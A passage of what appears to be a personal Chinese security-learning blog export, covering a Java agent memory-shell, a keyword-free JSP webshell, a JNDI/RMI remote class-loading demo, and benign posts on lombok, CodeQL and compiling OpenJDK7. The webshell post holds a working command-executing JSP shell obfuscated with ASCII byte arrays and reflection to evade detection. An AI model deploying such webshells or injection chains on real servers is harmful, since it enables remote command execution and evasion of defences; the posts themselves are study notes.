e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!className.equals(targetVMClassName)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                    System.out.println(<span class="string">&quot;do transform&quot;</span>);</span><br><span class="line">                    ClassPool cp=ClassPool.getDefault();</span><br><span class="line">                    <span class="keyword">if</span> (classBeingRedefined != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">//添加新的路径</span></span><br><span class="line">                        ClassClassPath ccp = <span class="keyword">new</span> ClassClassPath(classBeingRedefined);</span><br><span class="line">                        cp.insertClassPath(ccp);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">&quot;获取到ClassPool&quot;</span>);</span><br><span class="line">                    CtClass ctc = cp.get(<span class="keyword">this</span>.targetClassName);</span><br><span class="line">                    System.out.println(ctc.getName());</span><br><span class="line">                    CtMethod method = ctc.getDeclaredMethod(<span class="keyword">this</span>.targetMethodName);</span><br><span class="line">                    System.out.println(method.getName());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    String source = readTXT(<span class="string">&quot;C:\\Users\\yuand\\Desktop\\data2.txt&quot;</span>);</span><br><span class="line">                    source=<span class="string">&quot;try &#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;            Runtime.getRuntime().exec(\&quot;calc\&quot;);\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        &#125; catch (java.io.IOException e) &#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;            e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        &#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                    System.out.println(<span class="string">&quot;执行插入代码方法&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    method.insertBefore(source);</span><br><span class="line">                    <span class="keyword">byte</span>[] bytes = ctc.toBytecode();</span><br><span class="line">                    ctc.detach();</span><br><span class="line">                    <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>插入代码这里通过txt文件读取的代码总是因为格式原因报错,直接写的打开计算器的代码可以正常插入并执行</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220429110139169.png" alt="image-20220429110139169"></p>
<p>对于txt文件内代码格式问题还需要再稍微研究一下</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>memshell</tag>
        <tag>javaAgent</tag>
      </tags>
  </entry>
  <entry>
    <title>jsp无关键字一句话</title>
    <url>/2022/05/16/jsp%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
    <content><![CDATA[<p>通过ascii码与字符之间的转换,加上通过反射加载类,实现无关键字一句话</p>
<h4 id="py脚本script-str2ascii"><a href="#py脚本script-str2ascii" class="headerlink" title="py脚本script_str2ascii"></a>py脚本<code>script_str2ascii</code></h4><p>首先写一个简单的py脚本,转换命令为byte数组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="built_in">input</span>(<span class="string">&quot;input code&quot;</span>)</span><br><span class="line">arr=[]</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">    arr.append(<span class="built_in">ord</span>(char))</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br></pre></td></tr></table></figure>

<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>接下来找一个简单的小马,进行改造</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="comment">//加一个系统的判断</span></span><br><span class="line">    String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">    <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">    BufferedReader bufferedReader;</span><br><span class="line">    <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">        isWin = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String len;</span><br><span class="line">        <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">   out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="通过反射改变获取类并执行的方式"><a href="#通过反射改变获取类并执行的方式" class="headerlink" title="通过反射改变获取类并执行的方式"></a>通过反射改变获取类并执行的方式</h4><p>主要目的是将runtime相关的类和函数通过反射进行修改</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//这个forName加载类的时候会执行类内的静态代码块</span></span><br><span class="line">    Method method = aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">    Object o = method.invoke(<span class="keyword">null</span>);<span class="comment">//这里获取到runtime类</span></span><br><span class="line">    Method method1 = aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    method1.invoke(o,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>通过反射加载runtime类的方式可行,并且成功弹出了计算器</p>
<p>接下来通过ascii数组,替换其中比较敏感的字符串</p>
<p>上面那个小马里面别的不关键的东西懒得写了…..</p>
<p><strong>这里可以使用byte数组,原因是当前涉及到的字符串中的所有字符ascii码均在127以下</strong></p>
<h4 id="加入byte数组"><a href="#加入byte数组" class="headerlink" title="加入byte数组"></a>加入byte数组</h4><p>通过byte数组修饰以下关键字</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">byte</span>[] a=&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="keyword">new</span> String(a));<span class="comment">//这个forName加载类的时候会执行类内的静态代码块</span></span><br><span class="line">    <span class="keyword">byte</span>[] b=&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;;</span><br><span class="line">    Method method = aClass.getMethod(<span class="keyword">new</span> String(b));</span><br><span class="line">    Object o = method.invoke(<span class="keyword">null</span>);<span class="comment">//这里获取到runtime类</span></span><br><span class="line">    <span class="keyword">byte</span>[] c=&#123;<span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>&#125;;</span><br><span class="line">    Method method1 = aClass.getMethod(<span class="keyword">new</span> String(c), String.class);</span><br><span class="line">    method1.invoke(o,request.getParameter(<span class="string">&quot;haha&quot;</span>));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>比较基础的东西,别笑话我呜呜呜呜</p>
]]></content>
      <tags>
        <tag>一句话</tag>
      </tags>
  </entry>
  <entry>
    <title>jndi注入学习</title>
    <url>/2022/05/04/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="JNDI简介"><a href="#JNDI简介" class="headerlink" title="JNDI简介"></a>JNDI简介</h3><p>JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。</p>
<p>常见的命名/目录提供者</p>
<ul>
<li>RMI</li>
<li>LDAP</li>
<li>CORBA</li>
<li>DNS</li>
</ul>
<p>一个简单的例子开始JNDI的学习</p>
<p>首先编写并编译恶意class文件放到可访问的URL上,接着将其URL注册并绑定给该服务器某端口的RMI服务商</p>
<blockquote>
<p>这里有个问题,为什么不直接使用RMI来加载恶意类呢</p>
</blockquote>
<p>因为RMI它的特点是调用完结果是由RMI服务器去执行的,执行完的结果以序列化的形式传递给客户端,虽然可能存在反序列化的利用,但是不符合这里想要构造的远程加载恶意class文件并在客户端上面执行的思路</p>
<p>恶意类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>server.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//第一个参数随便填</span></span><br><span class="line">        Reference reference=<span class="keyword">new</span> Reference(<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:5555/&quot;</span>);</span><br><span class="line">        <span class="comment">//这里末尾要加个/,否则无法读取.....</span></span><br><span class="line">        <span class="comment">//将该reference封装成远程对象</span></span><br><span class="line">        ReferenceWrapper referenceWrapper=<span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;hello&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>client.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url=<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>;</span><br><span class="line">        Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后本质上是通过URLClassLoader去远程加载了恶意类</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jndi</tag>
      </tags>
  </entry>
  <entry>
    <title>lombok小工具</title>
    <url>/2022/02/01/lombok%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>使用这款小工具可以通过添加注解来实现类的构造方法,set,get方法,让代码更简洁</p>
<h3 id="导入maven依赖"><a href="#导入maven依赖" class="headerlink" title="导入maven依赖"></a>导入maven依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span>     <span class="comment">//添加get,set方法</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span><span class="comment">//无参构造</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span><span class="comment">//全参构造</span></span><br></pre></td></tr></table></figure>

<h3 id="安装lombok插件"><a href="#安装lombok插件" class="headerlink" title="安装lombok插件"></a>安装lombok插件</h3><p>IDEAsetting里面一直无法下载插件</p>
<p>IDEA官网下载链接,下载后直接安装就行</p>
<p><a href="https://plugins.jetbrains.com/plugin/6317-lombok">https://plugins.jetbrains.com/plugin/6317-lombok</a></p>
<p>idea2020.1.1版本的</p>
<p><a href="https://plugins.jetbrains.com/files/6317/100775/lombok-plugin-0.33-2020.1.zip?updateId=100775&amp;pluginId=6317&amp;family=INTELLIJ">https://plugins.jetbrains.com/files/6317/100775/lombok-plugin-0.33-2020.1.zip?updateId=100775&amp;pluginId=6317&amp;family=INTELLIJ</a></p>
<h3 id="开启AnnocationProcessors"><a href="#开启AnnocationProcessors" class="headerlink" title="开启AnnocationProcessors"></a>开启AnnocationProcessors</h3><p>点击File– Settings设置界面，开启 AnnocationProcessors：</p>
<p>按下alt+7即可看到已经生成了对应的构造器和get,set方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220201204237651.png" alt="image-20220201204237651"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>lombok</tag>
      </tags>
  </entry>
  <entry>
    <title>使用codeql的cc链分析</title>
    <url>/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>使用codeql来分析cc链</p>
<p>由于codeql无法多个数据库之间查询流,所以只能采用半条链拼接半条链的方式来进行操作</p>
<p><a href="https://www.freebuf.com/articles/web/283795.html">参考文章</a></p>
<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">什么是source和sink</span><br><span class="line"></span><br><span class="line">在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</span><br><span class="line"></span><br><span class="line">source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</span><br><span class="line"></span><br><span class="line">sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</span><br><span class="line"></span><br><span class="line">sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</span><br></pre></td></tr></table></figure>

<p>分析cc1进行一次尝试</p>
]]></content>
      <categories>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>codeql</tag>
        <tag>cc</tag>
      </tags>
  </entry>
  <entry>
    <title>centos编译openjdk7成功---但是创建codeql数据库失败的记录</title>
    <url>/2022/05/16/%E7%BC%96%E8%AF%91jdk7%E5%B9%B6%E6%9E%84%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h2 id="centos编译openjdk7成功—但是创建codeql数据库失败的记录"><a href="#centos编译openjdk7成功—但是创建codeql数据库失败的记录" class="headerlink" title="centos编译openjdk7成功—但是创建codeql数据库失败的记录"></a>centos编译openjdk7成功—但是创建codeql数据库失败的记录</h2><blockquote>
<p>实验环境</p>
<p>centos7</p>
<p>jdk1.6.0_45 (这点很重要,起初由于使用了jdk8作为bootjdk导致莫名其妙的报错,查询了很久才解决)</p>
</blockquote>
<p>本篇文章可以作为编译openjdk7的参考,但是由于不熟悉编译原理,到底为什么可以编译openjdk7却不能像openjdk8一样生成对应的codeql数据库就不知道为啥了</p>
<p>安装所需库和工具,依次执行按y即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install cups-devel.x86_64</span><br><span class="line">yum install freetype.x86_64 freetype-devel.x86_64</span><br><span class="line">yum install alsa*</span><br><span class="line">yum install ant</span><br><span class="line">yum install cups-devel</span><br><span class="line">yum install glibc-static libstdc++-static</span><br><span class="line">yum install libX*</span><br><span class="line">yum install libXt-devel</span><br><span class="line">yum install libXrender-devel</span><br><span class="line">yum install libXext-devel</span><br><span class="line">yum install libXtst-devel</span><br><span class="line">yum install gcc gcc-c++</span><br><span class="line">yum install freetype-devel</span><br><span class="line">yum install libstdc++-static</span><br></pre></td></tr></table></figure>

<h3 id="安装BootJdk"><a href="#安装BootJdk" class="headerlink" title="安装BootJdk"></a>安装BootJdk</h3><p>去官网下载安装jdk1.6</p>
<blockquote>
<p>链接<a href="https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html">https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html</a></p>
</blockquote>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220516125517310.png" alt="image-20220516125517310"></p>
<p>下载下来通过ssh工具传到usr/local目录下</p>
<p><code>chmod 775 jdk-6u45-linux-x64.bin </code></p>
<p>使用改命令修改其为可执行</p>
<p><code>./jdk-6u45-linux-x64.bin</code></p>
<p>会自动在当前目录解压出来一个<code>jdk1.6.0_45</code></p>
<p>接着,修改系统变量</p>
<p><code>vim /etc/profile</code></p>
<p>在最下面插入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#set Java enviroment</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib:/usr/<span class="built_in">local</span>/src/apache-ant-1.8.2/lib/ant-launcher.jar</span><br><span class="line"></span><br><span class="line"><span class="comment">#set Ant enviroment</span></span><br><span class="line"></span><br><span class="line">ANT_HOME=/usr/<span class="built_in">local</span>/src/apache-ant-1.8.2</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$ANT_HOME</span>/bin:<span class="variable">$CLASSPATH</span>:<span class="variable">$JRE_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p>然后<code>!wq</code>退出</p>
<p><code>source /etc/profile</code>更新变量</p>
<p><code>java-version</code></p>
<p>显示为jdk1,6即配置成功</p>
<h3 id="下载openjdk"><a href="#下载openjdk" class="headerlink" title="下载openjdk"></a>下载openjdk</h3><p>直接去官网下载很慢,推荐一个技巧,参考链接<a href="https://blog.csdn.net/wbo112/article/details/121584122">https://blog.csdn.net/wbo112/article/details/121584122</a></p>
<p>文章中添加的是openjdk的仓库,我们在openjdk的github仓库那里搜索jdk7u按照一样的方式即可生成到码云</p>
<p>我们需要编译的是jdk7u21,在生成好的jdk7u仓库里面通过标签找到对应版本下载即可</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220516132045787.png" alt="image-20220516132045787"></p>
<p>通过ssh上传到centos的任意位置</p>
<p>然后通过<code>unzip</code>进行解压</p>
<p>解压完成后进入解压出来的目录</p>
<p>在里面创建bash脚本</p>
<p><code>touch jdk.sh</code></p>
<p><code>chmod jdk.sh</code></p>
<p><code>vim jdk.sh</code></p>
<p>往里面添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=C</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_BOOTDIR=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_JDK_IMPORT_PATH=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALLOW_DOWNLOADS=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> HOTSPOT_BUILD_JOBS=4</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_PARALLEL_COMPILE_JOBS=4</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_COMPARE_IMAGES=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> USE_PRECOMPILED_HEADER=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_LANGTOOLS=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export BUILD_JAXP=false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_JAXWS=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export BUILD_CORBA=false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_HOTSPOT=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_JDK=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> DISABLE_HOTSPOT_OS_VERSION_CHECK=ok</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_DEBUG_BUILD=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_FASTDEBUG_BUILD=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> DEBUG_NAME=debug</span><br><span class="line"></span><br><span class="line">BUILD_DEPLOY=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">BUILD_INSTALL=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_OUTPUTDIR=/usr/<span class="built_in">local</span>/src/openjdk/build</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> JAVA_HOME</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> CLASSPATH</span><br><span class="line"></span><br><span class="line">make sanity</span><br></pre></td></tr></table></figure>

<p>然后<code>!wq</code>退出并保存</p>
<p>接着<code>source ./jdk.sh</code></p>
<p>如果输出结果为Sanity check passed表示编译检查通过(但是不代表编译一定不会出错)</p>
<p>如果检查通过了,不要切换终端,(因为设定的变量在其他终端中无法读取)</p>
<p>就在当前终端中输入<code>make</code>进行编译</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220516124540997.png" alt="image-20220516124540997"></p>
<p>最终在经过大概15分钟的等待之后,出现这段字符就表示编译成功了,我这里两分钟是因为已经编译过一次了</p>
<h3 id="生成codeql数据库失败"><a href="#生成codeql数据库失败" class="headerlink" title="生成codeql数据库失败"></a>生成codeql数据库失败</h3><p>我编译jdk7u21的数据库的初衷是想使用codeql编写7u21反序列化漏洞的查询语句试试水</p>
<p>对编译原理啥的都不咋了解,甚至连jdk为啥要编译都不知道…</p>
<p>编译数据库的过程是参考的这篇大佬编译jdk8数据库的<a href="https://blog.csdn.net/mole_exp/article/details/122330521">文章</a></p>
<p>按照本篇文章的操作,只要通过make编译jdk的准备都做好,并且make编译还成功了的话,使用这段语句便可成功编译出jdk的codeql数据库</p>
<p><code>codeql database create openjdk7u21-db --language=&quot;java&quot; --command=&quot;make&quot; --overwrite</code></p>
<p>但是不知道为什么在jdk7上面行不通,如果后面编译成功了的话,再来更新这篇文章</p>
<blockquote>
<p>参考文章</p>
<p><a href="https://blog.csdn.net/m0_37726449/article/details/81226606">https://blog.csdn.net/m0_37726449/article/details/81226606</a></p>
<p><a href="https://blog.csdn.net/mole_exp/article/details/122330521">https://blog.csdn.net/mole_exp/article/details/122330521</a></p>
</blockquote>
]]></content>
  </entry>
</search>
